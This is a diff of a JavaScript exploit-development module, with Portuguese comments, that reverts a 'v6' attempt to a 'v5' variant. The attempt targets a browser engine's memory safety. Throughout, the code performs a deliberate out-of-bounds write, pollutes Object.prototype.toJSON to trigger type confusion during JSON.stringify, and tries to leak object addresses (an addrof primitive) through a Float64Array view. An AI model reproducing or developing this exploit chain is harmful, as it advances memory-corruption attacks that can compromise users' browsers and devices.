@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v6_AdjustCrashCondition)
+// js/script3/testArrayBufferVictimCrash.mjs (Conteúdo da v5_ReliableLogging)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,21 +9,20 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC = "OriginalHeisenbug_TypedArrayAddrof_v6_AdjustCrashCondition";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL = "OriginalHeisenbug_TypedArrayAddrof_v5_ReliableLogging";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
-// AJUSTE NO VALOR CRÍTICO PARA TENTAR EVITAR CRASH POR FALTA DE MEMÓRIA
-const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0x7FFFFFFF; // Anteriormente 0xFFFFFFFF
+const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF; // Valor original da v5
 
-let last_probe_call_details_v6 = null;
-let object_to_leak_A_v6 = null;
-let object_to_leak_B_v6 = null;
-let victim_typed_array_ref_v6 = null;
+let last_probe_call_details_v5 = null;
+let object_to_leak_A_v5 = null;
+let object_to_leak_B_v5 = null;
+let victim_typed_array_ref_v5 = null;
 
-function toJSON_TA_Probe_AdjustCrashCondition() {
+function toJSON_TA_Probe_ReliableLogging() {
     let current_call_details = {
-        probe_variant: "TA_Probe_Addrof_v6_AdjustCrashCondition",
+        probe_variant: "TA_Probe_Addrof_v5_ReliableLogging",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: true,
@@ -34,29 +33,29 @@ function toJSON_TA_Probe_AdjustCrashCondition() {
     try {
         current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
         
-        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v6? ${this === victim_typed_array_ref_v6}`, "leak");
+        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v5? ${this === victim_typed_array_ref_v5}`, "leak");
 
         if (current_call_details.this_type_in_toJSON === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
             
-            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v6);
-            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v6? ${current_call_details.this_was_victim_ref_when_confused}`, "info");
+            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v5);
+            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v5? ${current_call_details.this_was_victim_ref_when_confused}`, "info");
 
             logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
-            if (object_to_leak_A_v6) {
-                this[0] = object_to_leak_A_v6;
-                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v6 to this[0].`, "info");
+            if (object_to_leak_A_v5) {
+                this[0] = object_to_leak_A_v5;
+                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v5 to this[0].`, "info");
             }
-            if (object_to_leak_B_v6) {
-                this[1] = object_to_leak_B_v6;
-                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v6 to this[1].`, "info");
+            if (object_to_leak_B_v5) {
+                this[1] = object_to_leak_B_v5;
+                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v5 to this[1].`, "info");
             }
             current_call_details.writes_attempted_on_confused_this = true;
 
-        } else if (this === victim_typed_array_ref_v6) {
-            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v6, type is ${current_call_details.this_type_in_toJSON}. No confusion yet for this 'this'.`, "info");
+        } else if (this === victim_typed_array_ref_v5) {
+            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v5, type is ${current_call_details.this_type_in_toJSON}. No confusion yet for this 'this'.`, "info");
         } else {
-            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v6. No action.`, "warn");
+            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v5. No action.`, "warn");
         }
 
     } catch (e) {
@@ -65,20 +64,20 @@ function toJSON_TA_Probe_AdjustCrashCondition() {
     }
     
     logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Current_call_details to be set to global: ${JSON.stringify(current_call_details)}`, "dev");
-    last_probe_call_details_v6 = { ...current_call_details };
+    last_probe_call_details_v5 = { ...current_call_details };
 
-    return { minimal_probe_v6_did_execute: true }; 
+    return { minimal_probe_v5_did_execute: true }; 
 }
 
-export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}.triggerAndAddrof`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, AdjustCrashCondition) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC} Init...`;
+export async function executeTypedArrayVictimAddrofTest_ReliableLogging() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL}.triggerAndAddrof`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, ReliableLogging) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL} Init...`;
 
-    last_probe_call_details_v6 = null;
-    victim_typed_array_ref_v6 = null;
-    object_to_leak_A_v6 = { marker: "ObjA_TA_v6acc", id: Date.now() }; 
-    object_to_leak_B_v6 = { marker: "ObjB_TA_v6acc", id: Date.now() + 890 };
+    last_probe_call_details_v5 = null;
+    victim_typed_array_ref_v5 = null;
+    object_to_leak_A_v5 = { marker: "ObjA_TA_v5rl", id: Date.now() }; 
+    object_to_leak_B_v5 = { marker: "ObjB_TA_v5rl", id: Date.now() + 789 };
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
@@ -87,7 +86,7 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
     
-    const fillPattern = 0.55667788990011;
+    const fillPattern = 0.44556677889900; // Padrão da v5
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -97,22 +96,22 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
         logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
         logS3(`   OOB corruption target in oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);
 
-        await PAUSE_S3(50); // Nova pausa ANTES da escrita crítica
+        // Pausas da v5 (apenas uma após a escrita)
         logS3(`STEP 1: Writing CRITICAL value ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
         oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
         logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
         
-        await PAUSE_S3(200); // Pausa DEPOIS da escrita crítica aumentada
+        await PAUSE_S3(100); // Pausa padrão da v5
 
-        victim_typed_array_ref_v6 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); // Simplificado
-        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v6.buffer);
+        victim_typed_array_ref_v5 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
+        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v5.buffer);
         
         for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
             float64_view_on_underlying_ab[i] = fillPattern + i;
         }
 
-        logS3(`STEP 2: victim_typed_array_ref_v6 (Uint8Array on buffer size ${VICTIM_BUFFER_SIZE}) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
-        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v6 with ${toJSON_TA_Probe_AdjustCrashCondition.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`STEP 2: victim_typed_array_ref_v5 (Uint8Array on buffer size ${VICTIM_BUFFER_SIZE}) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
+        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v5 with ${toJSON_TA_Probe_ReliableLogging.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -120,21 +119,21 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_TA_Probe_AdjustCrashCondition,
+                value: toJSON_TA_Probe_ReliableLogging,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} polluted with ${toJSON_TA_Probe_AdjustCrashCondition.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} polluted with ${toJSON_TA_Probe_ReliableLogging.name}.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v6)...`, "warn", FNAME_CURRENT_TEST);
-            stringifyOutput = JSON.stringify(victim_typed_array_ref_v6); 
+            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v5)...`, "warn", FNAME_CURRENT_TEST);
+            stringifyOutput = JSON.stringify(victim_typed_array_ref_v5); 
             
-            logS3(`  JSON.stringify(victim_typed_array_ref_v6) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify(victim_typed_array_ref_v5) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             
-            logS3(`  Global 'last_probe_call_details_v6' state immediately after stringify: ${last_probe_call_details_v6 ? JSON.stringify(last_probe_call_details_v6) : 'null'}`, "dev");
+            logS3(`  Global 'last_probe_call_details_v5' state immediately after stringify: ${last_probe_call_details_v5 ? JSON.stringify(last_probe_call_details_v5) : 'null'}`, "dev");
 
-            if (last_probe_call_details_v6) {
-                captured_probe_details_after_stringify = { ...last_probe_call_details_v6 }; 
+            if (last_probe_call_details_v5) {
+                captured_probe_details_after_stringify = { ...last_probe_call_details_v5 }; 
             }
             logS3(`  Copied 'captured_probe_details_after_stringify': ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
@@ -143,7 +142,7 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
                 captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                 
                 logS3(`  HEISENBUG CONFIRMED (via captured last probe details)! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
-                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v6? ${captured_probe_details_after_stringify.this_was_victim_ref_when_confused}`, "info");
+                logS3(`    In confused probe, 'this' === victim_typed_array_ref_v5? ${captured_probe_details_after_stringify.this_was_victim_ref_when_confused}`, "info");
                 logS3(`    In confused probe, addrof writes attempted? ${captured_probe_details_after_stringify.writes_attempted_on_confused_this}`, "info");
                 
                 logS3("STEP 3: Checking float64_view_on_underlying_ab AFTER Heisenbug and probe's write attempts...", "warn", FNAME_CURRENT_TEST);
@@ -158,9 +157,9 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
                     (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_A.success = true;
-                    addrof_result_A.message = "Heisenbug (AdjustCrashCondition) confirmed AND view[0] read suggests a pointer for ObjA.";
+                    addrof_result_A.message = "Heisenbug (ReliableLogging) confirmed AND view[0] read suggests a pointer for ObjA.";
                 } else {
-                    addrof_result_A.message = "Heisenbug (AdjustCrashCondition) confirmed, but view[0] read does not look like a pointer for ObjA or buffer was unchanged.";
+                    addrof_result_A.message = "Heisenbug (ReliableLogging) confirmed, but view[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                     if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value matches initial fillPattern)";
                 }
 
@@ -174,16 +173,16 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
                     (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_B.success = true;
-                    addrof_result_B.message = "Heisenbug (AdjustCrashCondition) confirmed AND view[1] read suggests a pointer for ObjB.";
+                    addrof_result_B.message = "Heisenbug (ReliableLogging) confirmed AND view[1] read suggests a pointer for ObjB.";
                 } else {
-                    addrof_result_B.message = "Heisenbug (AdjustCrashCondition) confirmed, but view[1] read does not look like a pointer for ObjB or buffer was unchanged.";
+                    addrof_result_B.message = "Heisenbug (ReliableLogging) confirmed, but view[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                     if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value matches initial fillPattern)";
                 }
 
                 if (addrof_result_A.success || addrof_result_B.success) {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Addr? SUCCESS!`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL}: Addr? SUCCESS!`;
                 } else {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Heisenbug OK, Addr Failed`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL}: Heisenbug OK, Addr Failed`;
                 }
 
             } else {
@@ -197,13 +196,13 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
                 }
                 addrof_result_A.message = msg; addrof_result_B.message = msg;
                 logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Heisenbug Failed`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL}: Heisenbug Failed`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
             logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL}: Stringify/Addrof ERR`;
             addrof_result_A.message = `Main execution error: ${e_str.name} - ${e_str.message}`;
             addrof_result_B.message = `Main execution error: ${e_str.name} - ${e_str.message}`;
         } finally {
@@ -218,7 +217,7 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
         errorCapturedMain = e_outer_main;
         logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V6_ACC} CRITICALLY FAILED`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V5_RL} CRITICALLY FAILED`;
         addrof_result_A.message = `Overall test error: ${e_outer_main.name}`;
         addrof_result_B.message = `Overall test error: ${e_outer_main.name}`;
     } finally {
@@ -233,14 +232,14 @@ export async function executeTypedArrayVictimAddrofTest_AdjustCrashCondition() {
             logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
         }
         
-        object_to_leak_A_v6 = null;
-        object_to_leak_B_v6 = null;
-        victim_typed_array_ref_v6 = null;
-        last_probe_call_details_v6 = null; 
+        object_to_leak_A_v5 = null;
+        object_to_leak_B_v5 = null;
+        victim_typed_array_ref_v5 = null;
+        last_probe_call_details_v5 = null; 
     }
     return { 
         errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, // Se o crash retornar, precisaremos reavaliar isso.
+        potentiallyCrashed: false,
         stringifyResult: stringifyOutput, 
         toJSON_details: captured_probe_details_after_stringify, 
         addrof_A_attempt_result: addrof_result_A,
